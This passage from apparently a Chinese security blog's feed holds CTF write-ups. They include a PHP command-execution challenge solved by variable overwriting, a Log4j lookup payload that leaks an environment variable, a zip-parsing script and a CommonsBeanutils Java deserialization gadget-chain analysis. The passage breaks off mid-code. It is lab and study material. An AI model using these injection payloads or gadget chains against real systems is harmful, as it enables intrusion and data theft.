    <span class="token punctuation">}</span>        <span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$secret</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">case</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token string">'admin'</span><span class="token punctuation">.</span><span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string">'secret'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">echo</span> <span class="token number">999</span><span class="token punctuation">;</span>                <span class="token function">cmd</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">.</span><span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string">'secret'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">echo</span> <span class="token number">666</span><span class="token punctuation">;</span>                <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">'/[^a-z0-9]/is'</span><span class="token punctuation">,</span> <span class="token string">'hacker'</span><span class="token punctuation">,</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">cmd</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">default</span><span class="token punctuation">:</span>                <span class="token keyword">echo</span> <span class="token string">"hello,the repairman!"</span><span class="token punctuation">;</span>                <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token variable">$mode</span> <span class="token operator">==</span> <span class="token string">'1'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">'hello,the user!We may change the mode to repaie the server,please keep it unchanged'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'refresh:5;url=index.php?mode=1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        exit<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>传一个secret为MD5后的token即可执行exec，但是preg_replace只让传字母数字。</p><p>然后注意到 ，通过url传参给变量赋值，这里我们把config变量赋值成空就可以了，secret传md5后的admin值即可享受999帝王权限。</p><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$url</span> <span class="token operator">=</span> <span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REQUEST_URI'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">[</span><span class="token string">'query'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>exec无回显，写文件即可，flag藏在config.php中。</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20221005225937220.png" alt="image-20221005225937220"></p><p>访问a.txt</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string">'serect'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">9999</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token string">'ctfshow{4439affe-320c-4865-98ab-3650a3483fca}'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h3><h4 id="easy-base"><a href="#easy-base" class="headerlink" title="easy_base"></a>easy_base</h4><p>翻转，base64解密即可。</p><h4 id="凯撒密码"><a href="#凯撒密码" class="headerlink" title="凯撒密码"></a>凯撒密码</h4><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">decode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    text<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'r'</span><span class="token punctuation">,</span> <span class="token string">'y'</span><span class="token punctuation">,</span> <span class="token string">'d'</span><span class="token punctuation">,</span> <span class="token string">'t'</span><span class="token punctuation">,</span> <span class="token string">'x'</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">,</span> <span class="token string">'i'</span><span class="token punctuation">,</span> <span class="token string">'{'</span><span class="token punctuation">,</span> <span class="token string">'y'</span><span class="token punctuation">,</span> <span class="token string">'x'</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">,</span> <span class="token string">'t'</span><span class="token punctuation">,</span> <span class="token string">'_'</span><span class="token punctuation">,</span> <span class="token string">'u'</span><span class="token punctuation">,</span> <span class="token string">'t'</span><span class="token punctuation">,</span> <span class="token string">'_'</span><span class="token punctuation">,</span> <span class="token string">'z'</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">,</span> <span class="token string">'d'</span><span class="token punctuation">,</span> <span class="token string">'d'</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'q'</span><span class="token punctuation">,</span> <span class="token string">'h'</span><span class="token punctuation">,</span> <span class="token string">'y'</span><span class="token punctuation">,</span> <span class="token string">'_'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> <span class="token string">'4'</span><span class="token punctuation">,</span> <span class="token string">'q'</span><span class="token punctuation">,</span> <span class="token string">'t'</span><span class="token punctuation">,</span> <span class="token string">'n'</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'!'</span><span class="token punctuation">,</span> <span class="token string">'!'</span><span class="token punctuation">,</span> <span class="token string">'}'</span><span class="token punctuation">]</span>    flag<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    table<span class="token operator">=</span>list<span class="token punctuation">(</span>ascii_lowercase<span class="token punctuation">)</span>    table<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'h'</span><span class="token punctuation">,</span> <span class="token string">'g'</span><span class="token punctuation">,</span> <span class="token string">'u'</span><span class="token punctuation">,</span> <span class="token string">'p'</span><span class="token punctuation">,</span> <span class="token string">'o'</span><span class="token punctuation">,</span> <span class="token string">'v'</span><span class="token punctuation">,</span> <span class="token string">'n'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'i'</span><span class="token punctuation">,</span> <span class="token string">'j'</span><span class="token punctuation">,</span> <span class="token string">'y'</span><span class="token punctuation">,</span> <span class="token string">'k'</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'z'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">,</span> <span class="token string">'q'</span><span class="token punctuation">,</span> <span class="token string">'t'</span><span class="token punctuation">,</span> <span class="token string">'l'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> <span class="token string">'d'</span><span class="token punctuation">,</span> <span class="token string">'x'</span><span class="token punctuation">,</span> <span class="token string">'e'</span><span class="token punctuation">,</span> <span class="token string">'s'</span><span class="token punctuation">,</span> <span class="token string">'m'</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">,</span> <span class="token string">'f'</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> key <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">:</span>         <span class="token keyword">for</span> i <span class="token keyword">in</span> text<span class="token punctuation">:</span>            <span class="token keyword">if</span> i <span class="token keyword">in</span> table<span class="token punctuation">:</span>                flag<span class="token punctuation">.</span>append<span class="token punctuation">(</span>table<span class="token punctuation">[</span><span class="token punctuation">(</span>table<span class="token punctuation">.</span>index<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span>key<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">26</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                flag<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span>        flag<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ctfshow{th1s_is_d1ffrent_c4esar!!}</p><h3 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h3><h4 id="你newbee吗"><a href="#你newbee吗" class="headerlink" title="你newbee吗"></a>你newbee吗</h4><p>拖到IDA。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WP </tag>
            
            <tag> ctfshow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GoogleCTF 2022</title>
      <link href="/2022/07/12/google-ctf-2022/"/>
      <url>/2022/07/12/google-ctf-2022/</url>
      
        <content type="html"><![CDATA[<h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><h4 id="Appnote-txt"><a href="#Appnote-txt" class="headerlink" title="Appnote.txt"></a>Appnote.txt</h4><blockquote><p>Every single archive manager unpacks this to a different file.ZIP压缩包相关题目。</p></blockquote><h5 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h5><p>首先给了一个dump.zip，解压之后发现hello.txt。</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220705010030.png" width=500 height=350/><p>但压缩包有60K，应该不止一个txt，尝试foremost分离无果。因此使用010 editor查看文件结构。会看到藏了很多以504B开头为标志的压缩包。</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220705011231.png" width=600 height=400/><p>并且会看到ZIP的数据区(倒数第五行)显示flag00，翻到结尾是flag18，这里猜测flag有19位。并且发现在每个flagxx后给了单个字符，很显然flag是根据位数一个个拼接得到的，但是我们可以看到很多压缩包都对应flag00，flag00后又有不同的字符，因此猜测：</p><p>​<strong>如果flag{n}{x}对应正确的压缩包，那么x就是FLAG的第n位</strong></p><p>问题就转化为如何判断真的压缩包，通过查阅资料可知，zip格式压缩包主要由三大部分组成：数据区(0x04034b50)、中央目录记录区(0x02014b50)、中央目录记录尾部区(0x06054b50)。可以发现假的压缩包是没有</p><p>中央目录记录尾部区的，因此全局搜索504B0506。</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220705014056.png"></p><p>有21个结果，第一个是hello.txt，第二个是hi.txt，剩下19个是真的压缩包flag{n}，中央目录记录尾部区主要作用是用来定位中央目录记录区的开始位置的。因此写脚本判断出尾部，再根据尾部区域对应的中央目录记录区的起始偏移找到第flagxx后的字符即可得到FLAG。</p><blockquote><pre class="line-numbers language-fallback"><code class="language-fallback"> 中央目录记录尾部区结构: 中央目录记录尾部开头标记    4 bytes  (0x06054b50) 中央目录记录尾部区所在磁盘编号             2 bytes 中央目录开始位置所在的磁盘编号  2 bytes 该磁盘上所记录的核心目录数量  2 bytes zip压缩包中的文件总数           2 bytes 整个中央目录的大小（以字节为单位）   4 bytes 中央目录开始位置相对位移        4 bytes 注释内容的长度        2 bytes 注释内容       (variable size)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><p>找到开头标记后，当前位置+16(因为中央目录开始位置相对位移的相对位置在16~20)，找到中央目录开始位置的offset，再-1即可找到字符(因为中央目录开始位置的偏移的前一个字符就是数据区中的数据)。</p><h5 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h5><p><code>exp</code></p><pre class="line-numbers language-python"><code class="language-python">a <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">"dump.zip"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>flag <span class="token operator">=</span> b<span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token keyword">if</span> a<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">==</span>b<span class="token string">"PK\x05\x06"</span><span class="token punctuation">:</span>    offset <span class="token operator">=</span> int<span class="token punctuation">.</span>from_bytes<span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">0x14</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"little"</span><span class="token punctuation">)</span>       <span class="token operator">//</span><span class="token number">0x10</span>对应<span class="token operator">+</span><span class="token number">16</span>    flag <span class="token operator">+=</span> a<span class="token punctuation">[</span>offset<span class="token number">-1</span><span class="token punctuation">:</span>offset<span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>CTF{p0s7m0d3rn_z1p}</p><hr><h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><h4 id="LOG4J"><a href="#LOG4J" class="headerlink" title="LOG4J"></a>LOG4J</h4><blockquote><p>具体原理还是没有完全理解，先记录一下解题过程。</p></blockquote><h5 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h5><p>访问靶机，会发现只有一个chatbot，随便输入点击submit后提示需要以&#x2F;为前缀，题目给了源码，直接看代码分析。</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220705145853.png" width=500 height=200/><p>打开源码可以看到使用flask写的路由，这里贴附关键代码。可以看到和chatbot交互实际上是通过运行jar来进行的，省略的部分就是以空格分割出cmd以及text。比如输入：love you。此时cmd为love，text为you，然后返回标准输出。这里的cmd比较可疑，我们接着审计java部分。</p><pre class="line-numbers language-python"><code class="language-python">@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        text <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'text'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span>        cmd <span class="token operator">=</span> <span class="token string">''</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>        result <span class="token operator">=</span> chat<span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> text<span class="token punctuation">)</span>        <span class="token keyword">return</span> result    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">chat</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> text<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># run java jar with a 10 second timeout</span>    res <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'java'</span><span class="token punctuation">,</span> <span class="token string">'-jar'</span><span class="token punctuation">,</span> <span class="token string">'-Dcmd='</span> <span class="token operator">+</span> cmd<span class="token punctuation">,</span> <span class="token string">'chatbot/target/app-1.0-SNAPSHOT.jar'</span><span class="token punctuation">,</span> <span class="token string">'--'</span><span class="token punctuation">,</span> text<span class="token punctuation">]</span><span class="token punctuation">,</span> capture_output<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>stderr<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>java部分代码审下来大概就是这些功能：</p><ul><li>输入help或者&#x2F;help，返回提示：Try some of our free commands below!  wc time repeat.</li><li>输入&#x2F;wc,返回0，输入&#x2F;wc {str}，返回str的长度。</li><li>输入&#x2F;time，返回时间。</li><li>输入&#x2F;repeat，返回空，输入&#x2F;repeat {str}，返回str。</li></ul><p>这里还是没啥头绪，因为这题是LOG4J，因此翻一下xml配置文件，发现了可疑点。PatternLayout是log4j用于指定输出格式的的一个参数，那么可以看到它是通过EL表达式${}的形式进行了命令执行。</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220705151856.png"></p><p>这里的cmd是我们可控的，又由于代码给出了flag变量，并且是从环境变量中提取的。</p><pre class="line-numbers language-java"><code class="language-java">String flag <span class="token operator">=</span> System<span class="token punctuation">.</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"FLAG"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>尝试一下${flag},没用。但是通过测试，输入${java:flag}发现了有趣的事，抛出了异常信息。</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220705152609.png" width=850 height=320/><p>经过搜索发现EL表达式可以获取环境变量:${env:xxx}，那么尝试用${java:${env:FLAG}}直接从环境变量取出flag。</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220705153104.png"></p><p>CTF{d95528534d14dc6eb6aeb81c994ce8bd}</p><p>这里我不知道为什么输入${java:xxx}就显示Exception，而${flag}这样的形式就不会输出Exception。希望看到的师傅们能给出解答，跪谢。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CommonsBeanutils利用链分析</title>
      <link href="/2022/01/06/commonsbeanutils-li-yong-lian-fen-xi/"/>
      <url>/2022/01/06/commonsbeanutils-li-yong-lian-fen-xi/</url>
      
        <content type="html"><![CDATA[<h4 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h4><p>commons-beanutils是用来操作JavaBean的工具。其中有一个方法可以调用任意类的getter方法。</p><pre class="line-numbers language-java"><code class="language-java">PropertyUtils<span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span> o1<span class="token punctuation">,</span> property <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>TempatesImpl#getOutputProperties方法触发了newTransformer方法，因此我们需要找谁能调用getOutputProperties方法。但实际上只有Process这个无法序列化的类调用了getOutputProperties。</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220909201618913.png" alt="image-20220909201618913"></p><p>这条链的巧妙就在于利用CB能操纵JavaBean的功能，如果getProperty的两个参数都可控，即调用getOutputProperties</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220909201444286.png" alt="image-20220909201444286"></p><p>compare就很熟悉了，经典的CC2，于是我们就通过PriorityQueue连通了链子。</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220909202216854.png" alt="image-20220909202216854"></p><h4 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h4><p>触发PriorityQueue反序列化，CC2的一系列流程走到PriorityQueue#siftDownUsingComparator进而触发BeanComparator#compare。</p><p>注：为什么不是在上面的if语句调用BeanComparator#compare？因为right&#x3D;2&#x3D;size,因此第一个条件不满足，直接跳过该if语句。</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220909194436694.png" alt="image-20220909194436694"></p><p>进入BeanComparator#compare，PropertyUtils#getProperty方法自动调用JavaBean的getter方法，property被赋值为OutputProperties，因此调用TemplatesImpl#getOutputProperties方法。</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220909194924113.png" alt="image-20220909194924113"></p><p>接下来调用newTransformer方法，就是标准的TemplatesImpl加载字节码任意代码执行的操作了。</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220909195557290.png" alt="image-20220909195557290"></p><h4 id="链子"><a href="#链子" class="headerlink" title="链子"></a>链子</h4><pre class="line-numbers language-java"><code class="language-java">PriorityQueue#readObjectBeanComparator#compareTemplatesImpl#getOutputPropertiesTemplatesImpl#newTransformerdefineClassnewInstance<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 日常学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> gadget </tag>
            
            <tag> Java安全 </tag>
            
            <tag> CB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>东华杯 Ezgadget</title>
      <link href="/2021/12/31/dong-hua-bei-ezgadget/"/>
      <url>/2021/12/31/dong-hua-bei-ezgadget/</url>
      
        <content type="html"><![CDATA[<h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><p>题目给的是一个jar包，运行也没啥东西。直接用IDEA反编译jar包。</p><p>项目目录如下图所示：</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220901084000488.png" alt="image-20220901084000488"></p><p>为了方便写exp，我照着这个结构构建了项目，如果只是写exp的话只需把Tools和ToStringBean贴到项目里即可。如果要debug，则用maven构建项目把pom.xml复制过来；完全按照反编译结构构建项目即可。</p><h4 id="审计分析"><a href="#审计分析" class="headerlink" title="审计分析"></a>审计分析</h4><p>先从Controller入手</p><pre class="line-numbers language-java"><code class="language-java">    <span class="token annotation punctuation">@ResponseBody</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"/readobject"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> String <span class="token function">unser</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"data"</span><span class="token punctuation">,</span>required <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">)</span> String data<span class="token punctuation">,</span> Model model<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> b <span class="token operator">=</span> Tools<span class="token punctuation">.</span><span class="token function">base64Decode</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>        InputStream inputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>        ObjectInputStream objectInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>inputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>        String name <span class="token operator">=</span> objectInputStream<span class="token punctuation">.</span><span class="token function">readUTF</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> year <span class="token operator">=</span> objectInputStream<span class="token punctuation">.</span><span class="token function">readInt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>name<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"gadgets"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> year <span class="token operator">==</span> <span class="token number">2021</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            objectInputStream<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token string">"welcome bro."</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>显然要从&#x2F;readobject路由入手，传入的data用bas64解码后进行反序列化，如果输出流写入字符串为gadgets且写入Int为2021，则执行反序列化。</p><p>整体反序列化流程了解完，接下来寻找危险函数。</p><p>很明显：</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ToStringBean</span> <span class="token keyword">extends</span> <span class="token class-name">ClassLoader</span> <span class="token keyword">implements</span> <span class="token class-name">Serializable</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> ClassByte<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">ToStringBean</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> String <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        ToStringBean toStringBean <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ToStringBean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Class <span class="token class-name">clazz</span> <span class="token operator">=</span> toStringBean<span class="token punctuation">.</span><span class="token function">defineClass</span><span class="token punctuation">(</span><span class="token punctuation">(</span>String<span class="token punctuation">)</span>null<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>ClassByte<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>ClassByte<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>        Object var3 <span class="token operator">=</span> null<span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            var3 <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InstantiationException</span> var5<span class="token punctuation">)</span> <span class="token punctuation">{</span>            var5<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IllegalAccessException</span> var6<span class="token punctuation">)</span> <span class="token punctuation">{</span>            var6<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token 